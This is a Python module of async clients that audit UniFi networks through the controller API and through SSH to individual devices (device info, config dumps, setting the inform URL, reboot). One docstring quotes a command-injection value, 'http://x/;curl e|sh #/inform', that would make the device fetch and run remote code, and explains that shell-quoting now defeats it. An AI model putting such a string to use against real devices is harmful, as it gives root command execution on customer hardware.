"""UniFi API clients for audit data collection.

Two modes:
  1. Controller mode — talks to UniFi Network Application (classic or UniFi OS)
  2. Direct mode — connects to individual devices via SSH/HTTP for standalone units

Usage:
    # Controller mode
    async with UniFiControllerClient("https://192.168.1.1:8443", "admin", "pass") as uf:
        sites = await uf.list_sites()
        devices = await uf.get_devices("default")

    # Direct device mode
    device = UniFiDirectDevice(host="192.168.1.10", username="ubnt", password="ubnt", device_type="ap")
    info = await device.get_info()
"""

from __future__ import annotations

import asyncio
import logging
from typing import Optional

import httpx

from app.integrations.http_retry import RetryExhausted, send_with_retry
from app.modules.api_result import ApiList

log = logging.getLogger(__name__)


def _as_list(data: dict) -> ApiList:
    """The ``data`` array of a controller response, carrying its read status.

    A UniFi controller reports a refusal as ``meta.rc == "error"`` while still
    returning ``data: []``. Every accessor used to do ``data.get("data", [])``
    and throw the ``meta`` away, so a 403 and a genuinely empty site produced
    the same empty list. This keeps the list — so iteration and ``len`` are
    unchanged — but reads ``meta`` into ``.error``, so a caller building a
    device count or a firmware verdict can tell the two apart.
    """
    meta = data.get("meta", {}) if isinstance(data, dict) else {}
    error = None
    if meta.get("rc") == "error":
        error = meta.get("msg") or "controller returned an error"
    items = data.get("data", []) if isinstance(data, dict) else []
    return ApiList(items, error=error)


# ═══════════════════════════════════════════════════════════════════════════════
# Controller client (existing, for managed environments)
# ═══════════════════════════════════════════════════════════════════════════════


class UniFiControllerClient:
    """Async UniFi Controller/OS API client."""

    def __init__(
        self,
        host: str,
        username: str,
        password: str,
        is_unifi_os: bool = False,
        verify_ssl: bool = True,
        timeout: float = 30.0,
    ):
        self.host = host.rstrip("/")
        self.username = username
        self.password = password
        self.is_unifi_os = is_unifi_os
        self._client = httpx.AsyncClient(
            base_url=self.host,
            verify=verify_ssl,
            timeout=timeout,
        )
        self._logged_in = False

    async def close(self):
        if self._logged_in:
            try:
                await self._logout()
            except Exception:
                pass
        await self._client.aclose()

    async def __aenter__(self):
        await self._login()
        return self

    async def __aexit__(self, *_):
        await self.close()

    # ── Authentication ────────────────────────────────────────────────────

    async def _login(self):
        """Probe both controller flavours, backing off if throttled.

        Login is the call a UniFi controller rate-limits hardest, and it is the
        first one every audit makes — so a throttled login used to fail the
        whole site rather than the one request. 429 is retried whatever the
        method, which is exactly the case this needs.

        Each attempt goes through the retry layer separately: the probe order
        is what discovers which flavour this controller is, and collapsing it
        would lose that.
        """
        creds = {"username": self.username, "password": self.password}

        async def _try(path: str):
            return await send_with_retry(
                lambda: self._client.post(path, json=creds),
                method="POST", target=f"UniFi login {path}",
            )

        try:
            if self.is_unifi_os:
                r = await _try("/api/auth/login")
                if r.status_code == 200:
                    self._logged_in = True
                    return

            r = await _try("/api/login")
            if r.status_code == 200:
                self._logged_in = True
                self.is_unifi_os = False
                return

            if not self.is_unifi_os:
                r = await _try("/api/auth/login")
                if r.status_code == 200:
                    self._logged_in = True
                    self.is_unifi_os = True
                    return
        except RetryExhausted as e:
            # Unreachable is not "wrong password", and the message an operator
            # reads should say which one it was.
            raise ConnectionError(f"UniFi controller unreachable: {e}") from e

        raise ConnectionError(f"UniFi login failed: HTTP {r.status_code}")

    async def _logout(self):
        if self.is_unifi_os:
            await self._client.post("/api/auth/logout")
        else:
            await self._client.post("/api/logout")
        self._logged_in = False

    # ── Core request methods ──────────────────────────────────────────────

    def _api_prefix(self) -> str:
        return "/proxy/network" if self.is_unifi_os else ""

    def _failed(self, path: str, exc: Exception) -> dict:
        """The controller's own error shape, so callers see one thing.

        ``meta.rc == "error"`` is how a UniFi controller reports a refusal, and
        keeping that shape means a caller checking it catches a transport
        failure too — rather than a transport failure arriving as some other
        shape nobody checks for.
        """
        log.warning("UniFi API %s: %s", path, exc)
        return {"data": [], "meta": {"rc": "error", "msg": str(exc)}}

    async def _get(self, path: str) -> dict:
        """Retried through the shared layer.

        A UniFi controller is on a customer LAN at the far end of a tunnel, and
        it throttles — hardest on login. One attempt meant a controller that
        answered 429 was recorded as unreachable for the whole audit.
        """
        url = f"{self._api_prefix()}{path}"
        try:
            r = await send_with_retry(
                lambda: self._client.get(url),
                method="GET", target=f"UniFi {path}",
            )
            r.raise_for_status()
            return r.json()
        except httpx.HTTPStatusError as e:
            log.warning("UniFi API %s: HTTP %d", path, e.response.status_code)
            return {"data": [], "meta": {"rc": "error", "msg": str(e)}}
        except Exception as e:
            return self._failed(path, e)

    async def _post(self, path: str, body: dict | None = None) -> dict:
        """Same, and the method matters here.

        A POST to a controller changes something, so the retry layer will not
        repeat it once the request has left — only a 429, or a connection that
        never opened, gets a second attempt.
        """
        url = f"{self._api_prefix()}{path}"
        try:
            r = await send_with_retry(
                lambda: self._client.post(url, json=body or {}),
                method="POST", target=f"UniFi {path}",
            )
            r.raise_for_status()
            return r.json()
        except httpx.HTTPStatusError as e:
            log.warning("UniFi API %s: HTTP %d", path, e.response.status_code)
            return {"data": [], "meta": {"rc": "error", "msg": str(e)}}
        except Exception as e:
            return self._failed(path, e)

    # ── Controller API methods ────────────────────────────────────────────

    async def list_sites(self) -> ApiList:
        return _as_list(await self._get("/api/self/sites"))

    async def get_devices(self, site: str = "default") -> ApiList:
        return _as_list(await self._get(f"/api/s/{site}/stat/device"))

    async def get_wlans(self, site: str = "default") -> ApiList:
        return _as_list(await self._get(f"/api/s/{site}/rest/wlanconf"))

    async def get_networks(self, site: str = "default") -> ApiList:
        return _as_list(await self._get(f"/api/s/{site}/rest/networkconf"))

    async def get_firewall_rules(self, site: str = "default") -> ApiList:
        return _as_list(await self._get(f"/api/s/{site}/rest/firewallrule"))

    async def get_settings(self, site: str = "default") -> ApiList:
        return _as_list(await self._get(f"/api/s/{site}/rest/setting"))

    async def get_clients(self, site: str = "default") -> ApiList:
        return _as_list(await self._get(f"/api/s/{site}/stat/sta"))

    async def get_alarms(self, site: str = "default") -> ApiList:
        return _as_list(await self._get(f"/api/s/{site}/stat/alarm"))

    async def get_health(self, site: str = "default") -> ApiList:
        return _as_list(await self._get(f"/api/s/{site}/stat/health"))

    async def get_rogueaps(self, site: str = "default") -> ApiList:
        return _as_list(await self._get(f"/api/s/{site}/stat/rogueap"))

    async def get_port_profiles(self, site: str = "default") -> ApiList:
        return _as_list(await self._get(f"/api/s/{site}/rest/portconf"))

    async def test_connection(self) -> dict:
        try:
            if not self._logged_in:
                await self._login()
            sites = await self.list_sites()
            return {
                "ok": True,
                "mode": "controller",
                "sites": len(sites),
                "site_names": [s.get("desc", s.get("name", "")) for s in sites[:10]],
                "controller_type": "UniFi OS" if self.is_unifi_os else "Classic",
            }
        except Exception as e:
            return {"ok": False, "error": str(e)}


# ═══════════════════════════════════════════════════════════════════════════════
# Direct device client (for standalone/unadopted devices)
# ═══════════════════════════════════════════════════════════════════════════════


class UniFiDirectDevice:
    """Connect to a single UniFi device directly (no controller needed).

    Supports two access methods:
      - HTTP API: https://<ip>/ — device-level info endpoint
      - SSH: ssh ubnt@<ip> — for reading config, firmware, adopting

    Device types: ap, gateway, switch
    """

    def __init__(
        self,
        host: str,
        username: str = "ubnt",
        password: str = "ubnt",
        device_type: str = "ap",
        port: int = 443,
        ssh_port: int = 22,
        verify_ssl: bool = True,
    ):
        self.host = host.rstrip("/")
        self.username = username
        self.password = password
        self.device_type = device_type  # ap, gateway, switch
        self.port = port
        self.ssh_port = ssh_port
        self._client = httpx.AsyncClient(
            base_url=f"https://{self.host}:{self.port}",
            verify=verify_ssl,
            timeout=15.0,
        )

    async def close(self):
        await self._client.aclose()

    async def __aenter__(self):
        return self

    async def __aexit__(self, *_):
        await self.close()

    # ── SSH helper ───────────────────────────────────────────────────────

    async def _ssh_exec(self, remote_cmd: str, timeout: float = 20) -> tuple[str, str, int]:
        """Run a command on the device via asyncssh.  Returns (stdout, stderr, rc)."""
        import asyncssh

        from app.services.ssh_connection import open_verified_connection
        try:
            # Host key is pinned on first contact and verified thereafter —
            # these sessions carry device credentials.
            conn = await open_verified_connection(
                hostname=self.host,
                port=self.ssh_port,
                username=self.username,
                password=self.password,
                connect_timeout=10,
            )
            async with conn:
                result = await asyncio.wait_for(
                    conn.run(remote_cmd, check=False),
                    timeout=timeout,
                )
                return (result.stdout or "", result.stderr or "", result.exit_status or 0)
        except asyncssh.DisconnectError as e:
            raise ConnectionError(f"SSH disconnect: {e}") from e
        except asyncssh.PermissionDenied:
            raise ConnectionError("SSH: feil brukernavn/passord")
        except OSError as e:
            raise ConnectionError(f"SSH: {e}") from e

    # ── HTTP info ────────────────────────────────────────────────────────

    async def get_device_info_http(self) -> dict:
        """Try to get device info via HTTP API (works on most UniFi devices)."""
        for path in ["/api/system", "/status", "/api/s/default/stat/device"]:
            try:
                r = await self._client.get(path)
                if r.status_code == 200:
                    data = r.json()
                    return data if isinstance(data, dict) else {"data": data}
            except Exception:
                continue
        return {}

    # ── SSH full audit ───────────────────────────────────────────────────

    async def get_device_info_ssh(self) -> dict:
        """Get rich device info via SSH.

        Runs a battery of commands and tries multiple parse strategies
        because different UniFi firmware versions expose data differently.
        """
        try:
            # Each command is separated by a unique marker so we can split
            remote_cmd = (
                # --- identity / hardware ---
                "echo '===BOARD==='; "
                "cat /etc/board.info 2>/dev/null || "
                "cat /proc/ubnthal/board.info 2>/dev/null || "
                "cat /tmp/board.info 2>/dev/null || true; "
                # --- firmware ---
                "echo '===VERSION==='; "
                "cat /etc/version 2>/dev/null || true; "
                # --- mca-cli-op info (most reliable on modern firmware) ---
                "echo '===MCAINFO==='; "
                "mca-cli-op info 2>/dev/null || info 2>/dev/null || true; "
                # --- mca-status key=value ---
                "echo '===MCASTATUS==='; "
                "mca-status 2>/dev/null || true; "
                # --- hostname ---
                "echo '===HOSTNAME==='; "
                "hostname 2>/dev/null || true; "
                # --- network interfaces ---
                "echo '===IFCONFIG==='; "
                "ip addr show 2>/dev/null || ifconfig 2>/dev/null || true; "
                # --- uptime ---
                "echo '===UPTIME==='; "
                "cat /proc/uptime 2>/dev/null || true; "
                # --- wireless ---
                "echo '===WIRELESS==='; "
                "iwinfo 2>/dev/null || iwconfig 2>/dev/null || true; "
                # --- connected clients ---
                "echo '===CLIENTS==='; "
                "wlanconfig ath0 list sta 2>/dev/null || "
                "iw dev wlan0 station dump 2>/dev/null | grep Station || true; "
                # --- system config (inform url, wireless config) ---
                "echo '===SYSCFG==='; "
                "cat /tmp/system.cfg 2>/dev/null | "
                "grep -E '^(mgmt|wireless|resolv|snmp|syslog|ntpclient|httpd|sshd|users)' 2>/dev/null | head -80 || true; "
                # --- running config for security check ---
                "echo '===SECURITY==='; "
                "grep -E '^(users\\.|sshd\\.|httpd\\.)' /tmp/running.cfg 2>/dev/null || "
                "grep -E '^(users\\.|sshd\\.|httpd\\.)' /tmp/system.cfg 2>/dev/null || true"
            )
            stdout, stderr, rc = await self._ssh_exec(remote_cmd, timeout=25)
            log.debug("SSH output from %s (%d bytes): %s", self.host, len(stdout), stdout[:500])

            info: dict = {"raw_output": stdout, "ssh_stderr": stderr if stderr.strip() else None}

            # ── Split into named sections ────────────────────────────
            sections: dict[str, str] = {}
            current = "_pre"
            buf: list[str] = []
            markers = {"===BOARD===", "===VERSION===", "===MCAINFO===",
                        "===MCASTATUS===", "===HOSTNAME===", "===IFCONFIG===",
                        "===UPTIME===", "===WIRELESS===", "===CLIENTS===",
                        "===SYSCFG===", "===SECURITY==="}
            for line in stdout.splitlines():
                stripped = line.strip()
                if stripped in markers:
                    sections[current] = "\n".join(buf)
                    current = stripped.strip("=").lower()
                    buf = []
                else:
                    buf.append(line)
            sections[current] = "\n".join(buf)

            # ── board.info → model, hardware rev ─────────────────────
            for line in sections.get("board", "").splitlines():
                if "=" in line:
                    k, _, v = line.partition("=")
                    k, v = k.strip(), v.strip()
                    bmap = {
                        "board.name": "model", "board.shortname": "model_short",
                        "board.sysid": "sysid", "board.hwaddr": "mac",
                        "board.hwrev": "hwrev", "board.serialno": "serial",
                    }
                    if k in bmap and v:
                        info[bmap[k]] = v

            # ── /etc/version → firmware ──────────────────────────────
            ver = sections.get("version", "").strip()
            if ver:
                info["firmware"] = ver.splitlines()[0].strip()

            # ── mca-cli-op info / info → Model, Version, MAC, etc ────
            info_map = {
                "model": "model", "version": "firmware", "mac address": "mac",
                "ip address": "ip", "hostname": "hostname", "uptime": "uptime_str",
                "status": "inform_status",
            }
            for line in sections.get("mcainfo", "").splitlines():
                if ":" in line:
                    k, _, v = line.partition(":")
                    k_lower = k.strip().lower()
                    v = v.strip()
                    if k_lower in info_map and v:
                        info.setdefault(info_map[k_lower], v)

            # ── mca-status key=value ─────────────────────────────────
            kv_map = {
                "hostname": "hostname", "model": "model", "firmware": "firmware",
                "mac": "mac", "ip": "ip", "essid": "essid",
                "status": "adoption_status",
                "cfgversion": "cfgversion", "default": "is_default",
                "inform_url": "inform_url", "uptime": "_uptime_sec",
            }
            for line in sections.get("mcastatus", "").splitlines():
                if "=" in line:
                    k, _, v = line.partition("=")
                    k, v = k.strip(), v.strip()
                    if k in kv_map and v:
                        info.setdefault(kv_map[k], v)

            # ── hostname fallback ────────────────────────────────────
            hn = sections.get("hostname", "").strip()
            if hn:
                info.setdefault("hostname", hn.splitlines()[0].strip())

            # ── uptime (from /proc/uptime → seconds) ─────────────────
            up_raw = sections.get("uptime", "").strip()
            if up_raw:
                try:
                    secs = int(float(up_raw.split()[0]))
                    days, rem = divmod(secs, 86400)
                    hours, rem = divmod(rem, 3600)
                    mins, _ = divmod(rem, 60)
                    parts = []
                    if days:
                        parts.append(f"{days}d")
                    if hours:
                        parts.append(f"{hours}t")
                    parts.append(f"{mins}m")
                    info.setdefault("uptime_str", " ".join(parts))
                    info["uptime_seconds"] = secs
                except (ValueError, IndexError):
                    pass

            # ── MAC from ifconfig/ip addr (fallback) ─────────────────
            if not info.get("mac"):
                import re
                mac_re = re.compile(r"([0-9a-fA-F]{2}(?::[0-9a-fA-F]{2}){5})")
                for line in sections.get("ifconfig", "").splitlines():
                    if "ether" in line.lower() or "hwaddr" in line.lower():
                        m = mac_re.search(line)
                        if m:
                            info["mac"] = m.group(1).upper()
                            break

            # ── IP from ifconfig/ip addr (fallback) ──────────────────
            if not info.get("ip"):
                import re
                for line in sections.get("ifconfig", "").splitlines():
                    m = re.search(r"inet (?:addr:)?(\d+\.\d+\.\d+\.\d+)", line)
                    if m and m.group(1) != "127.0.0.1":
                        info["ip"] = m.group(1)
                        break

            # ── Wireless info (SSID, channel, mode) ──────────────────
            import re
            for line in sections.get("wireless", "").splitlines():
                if "ESSID:" in line:
                    m = re.search(r'ESSID:"([^"]*)"', line)
                    if m:
                        info.setdefault("essid", m.group(1))
                elif "essid" in line.lower() and ":" in line:
                    # iwinfo format: wlan0  ESSID: "MyNetwork"
                    m = re.search(r'ESSID:\s*"([^"]*)"', line, re.IGNORECASE)
                    if m:
                        info.setdefault("essid", m.group(1))
                if "Channel:" in line or "channel" in line.lower():
                    m = re.search(r"[Cc]hannel[:\s]+(\d+)", line)
                    if m:
                        info.setdefault("channel", m.group(1))
                if "Mode:" in line:
                    m = re.search(r"Mode:\s*(\S+)", line)
                    if m:
                        info.setdefault("wifi_mode", m.group(1))

            # ── Client count ─────────────────────────────────────────
            clients_raw = sections.get("clients", "").strip()
            client_lines = [l for l in clients_raw.splitlines() if l.strip() and "Station" not in l.split()[0:1]]
            station_lines = [l for l in clients_raw.splitlines() if l.strip().startswith("Station")]
            info["client_count"] = len(station_lines) if station_lines else len(client_lines)

            # ── System config (inform URL, management, wireless) ─────
            inform_url = ""
            wireless_ssids: list[str] = []
            ssh_enabled = None
            https_port = None
            for line in sections.get("syscfg", "").splitlines():
                if "=" in line:
                    k, _, v = line.partition("=")
                    k, v = k.strip(), v.strip()
                    if k == "mgmt.server":
                        inform_url = v
                    elif k == "mgmt.authkey":
                        info["has_authkey"] = bool(v)
                    elif k.startswith("wireless.") and k.endswith(".ssid"):
                        wireless_ssids.append(v)
                    elif k.startswith("wireless.") and k.endswith(".security"):
                        info.setdefault("wifi_security", v)
                    elif k == "sshd.status":
                        ssh_enabled = v == "enabled"
                    elif k == "httpd.https.port":
                        https_port = v
            if inform_url:
                info.setdefault("inform_url", inform_url)
            if wireless_ssids:
                info["ssid_list"] = wireless_ssids
                info.setdefault("essid", wireless_ssids[0])
            if ssh_enabled is not None:
                info["ssh_enabled"] = ssh_enabled
            if https_port:
                info["https_port"] = https_port

            # ── Security analysis ────────────────────────────────────
            security_section = sections.get("security", "")
            info["default_credentials"] = (
                self.username == "ubnt" and self.password == "ubnt"
            )
            info["is_default_config"] = info.get("is_default", "false").lower() == "true"

            # Check if there's a custom admin user (vs default ubnt)
            admin_users = []
            for line in security_section.splitlines():
                if line.startswith("users.") and ".name=" in line:
                    admin_users.append(line.split("=", 1)[1].strip())
            if admin_users:
                info["admin_users"] = admin_users

            # Adoption status
            if inform_url:
                info["adopted"] = True
                info["adoption_status"] = "adopted"
            elif info.get("is_default_config"):
                info["adopted"] = False
                info["adoption_status"] = "factory default"
            else:
                info["adopted"] = False
                info["adoption_status"] = "standalone"

            return info
        except asyncio.TimeoutError:
            return {"error": "SSH timeout"}
        except FileNotFoundError:
            return {"error": "sshpass not installed — run: brew install hudochenkov/sshpass/sshpass"}
        except Exception as e:
            log.warning("SSH audit of %s failed: %s", self.host, e)
            return {"error": str(e)}

    # ── Device actions ───────────────────────────────────────────────────

    async def set_inform(self, controller_url: str) -> dict:
        """Set the inform URL to adopt this device to a controller.
        Example: controller_url = "http://192.168.1.1:8080/inform"

        The URL is shell-quoted because _ssh_exec runs a command *line* on the
        device, as root. Interpolating it raw made any caller who could reach
        this method an arbitrary-root-command executor on customer network
        hardware — the caller-side check only required the string to start with
        "http" and end with "/inform", which "http://x/;curl e|sh #/inform"
        satisfies. The route validates the URL properly as well; this is the
        boundary that makes the shape of the string stop mattering.
        """
        import shlex

        if not controller_url:
            return {"ok": False, "error": "Controller URL er påkrevd"}
        try:
            stdout, stderr, rc = await self._ssh_exec(
                f"mca-cli-op set-inform {shlex.quote(controller_url)}", timeout=15
            )
            output = stdout.strip()
            ok = rc == 0 and ("Adoption" in output or "inform" in output.lower() or not stderr.strip())
            return {"ok": ok, "output": output, "error": stderr.strip() if not ok else None}
        except asyncio.TimeoutError:
            return {"ok": False, "error": "SSH timeout"}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    async def reboot(self) -> dict:
        """Reboot the device."""
        try:
            stdout, stderr, rc = await self._ssh_exec("reboot", timeout=10)
            return {"ok": True, "output": "Reboot-kommando sendt"}
        except asyncio.TimeoutError:
            # Expected — device drops connection on reboot
            return {"ok": True, "output": "Enheten starter på nytt"}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    async def get_config_dump(self) -> dict:
        """Get the full running configuration (for backup/review).

        Tries multiple config file locations and falls back to
        collecting individual config data via commands.
        """
        try:
            # Try multiple config locations + fallback to commands
            stdout, stderr, rc = await self._ssh_exec(
                "echo '=== /tmp/system.cfg ==='; "
                "cat /tmp/system.cfg 2>/dev/null || echo '__EMPTY__'; "
                "echo '=== /tmp/running.cfg ==='; "
                "cat /tmp/running.cfg 2>/dev/null || echo '__EMPTY__'; "
                "echo '=== /etc/persistent/cfg/mgmt ==='; "
                "cat /etc/persistent/cfg/mgmt 2>/dev/null || echo '__EMPTY__'; "
                "echo '=== ubntconf ==='; "
                "ubntconf 2>/dev/null || echo '__EMPTY__'; "
                "echo '=== /tmp/cfg ==='; "
                "ls /tmp/cfg/ 2>/dev/null || echo '__EMPTY__'; "
                "echo '=== mca-ctrl -t dump-cfg ==='; "
                "mca-ctrl -t dump-cfg 2>/dev/null || echo '__EMPTY__'",
                timeout=20,
            )
            # Parse sections and pick the first non-empty one
            sections: list[tuple[str, str]] = []
            current_header = ""
            current_lines: list[str] = []
            for line in stdout.splitlines():
                if line.startswith("=== ") and line.endswith(" ==="):
                    if current_header and current_lines:
                        content = "\n".join(current_lines).strip()
                        if content and content != "__EMPTY__":
                            sections.append((current_header, content))
                    current_header = line.strip("= ")
                    current_lines = []
                else:
                    current_lines.append(line)
            # Last section
            if current_header and current_lines:
                content = "\n".join(current_lines).strip()
                if content and content != "__EMPTY__":
                    sections.append((current_header, content))

            if not sections:
                return {"ok": False, "error": "Ingen konfigurasjon funnet på enheten"}

            # Build combined output
            config_parts = []
            for header, content in sections:
                config_parts.append(f"# --- {header} ---\n{content}")
            config_text = "\n\n".join(config_parts)
            return {"ok": True, "config": config_text, "sources": [s[0] for s in sections]}
        except asyncio.TimeoutError:
            return {"ok": False, "error": "SSH timeout"}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    async def test_connection(self) -> dict:
        """Test connectivity to a standalone device."""
        result: dict = {
            "ok": False,
            "mode": "direct",
            "host": self.host,
            "device_type": self.device_type,
            "http": False,
            "ssh": False,
        }

        # Try HTTP first
        http_info = await self.get_device_info_http()
        if http_info and "error" not in http_info:
            result["http"] = True
            result["ok"] = True
            result["model"] = http_info.get("model", http_info.get("data", [{}])[0].get("model", "") if isinstance(http_info.get("data"), list) else "")
            result["firmware"] = http_info.get("version", "")

        # Try SSH
        ssh_info = await self.get_device_info_ssh()
        if ssh_info and "error" not in ssh_info:
            result["ssh"] = True
            result["ok"] = True
            result["model"] = result.get("model") or ssh_info.get("model", "")
            result["firmware"] = result.get("firmware") or ssh_info.get("firmware", "")
            result["hostname"] = ssh_info.get("hostname", "")
            result["mac"] = ssh_info.get("mac", "")

        if not result["ok"]:
            result["error"] = ssh_info.get("error", http_info.get("error", "Kunne ikke koble til enheten"))

        return result


# ═══════════════════════════════════════════════════════════════════════════════
